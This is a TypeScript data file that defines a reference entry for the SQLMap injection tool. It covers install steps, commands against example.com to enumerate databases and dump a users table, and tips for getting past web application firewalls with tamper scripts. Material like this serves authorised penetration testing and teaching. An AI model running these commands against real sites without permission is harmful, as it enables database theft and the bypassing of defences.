import { ToolGuide } from "@/lib/guide-types"

export const sqlmapGuide: ToolGuide = {
  id: "sqlmap",
  name: "SQLMap",
  icon: "database",
  category: "Web Vulnerabilities",
  description: "Automatic SQL injection detection and exploitation tool",
  installation: {
    title: "Installation",
    steps: [
      "Clone from GitHub or use package manager",
      "Ensure Python 3 is installed",
      "Verify installation"
    ],
    code: `# Using Git
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version

# Kali Linux
apt install sqlmap

# macOS
brew install sqlmap`
  },
  usage: {
    title: "Basic Usage",
    description: "Test and exploit SQL injection vulnerabilities",
    code: `# Basic test
sqlmap -u "https://example.com/page?id=1"

# With POST data
sqlmap -u "https://example.com/login" --data="user=admin&pass=test"

# Database enumeration
sqlmap -u "https://example.com/page?id=1" --dbs

# Dump table
sqlmap -u "https://example.com/page?id=1" -D dbname -T users --dump

# With cookie
sqlmap -u "https://example.com/page?id=1" --cookie="session=abc123"`
  },
  commands: [
    { command: "-u", description: "Target URL with parameter" },
    { command: "--data", description: "POST data string" },
    { command: "--dbs", description: "Enumerate databases" },
    { command: "-D", description: "Specify database" },
    { command: "-T", description: "Specify table" },
    { command: "--dump", description: "Dump table contents" },
    { command: "--cookie", description: "HTTP cookie header" },
    { command: "--level", description: "Test level (1-5)" },
    { command: "--risk", description: "Risk level (1-3)" },
    { command: "--batch", description: "Non-interactive mode" },
    { command: "--tamper", description: "Use tamper scripts" }
  ],
  whenToUse: [
    "Testing for SQL injection",
    "Exploiting confirmed SQLi",
    "Database enumeration",
    "Data extraction",
    "Privilege escalation via SQLi"
  ],
  notes: [
    "Always get authorization before testing",
    "Start with low level/risk and increase",
    "Use --tamper for WAF bypass",
    "Check all injectable parameters"
  ],
  commonErrors: [
    {
      error: "Parameter not injectable",
      solution: "Try --level=5 --risk=3 or test manually first"
    },
    {
      error: "WAF blocking requests",
      solution: "Use --tamper scripts like space2comment, randomcase"
    },
    {
      error: "Connection timeouts",
      solution: "Increase --timeout or use --delay between requests"
    }
  ],
  tags: ["sqli", "database", "exploitation", "injection"]
}
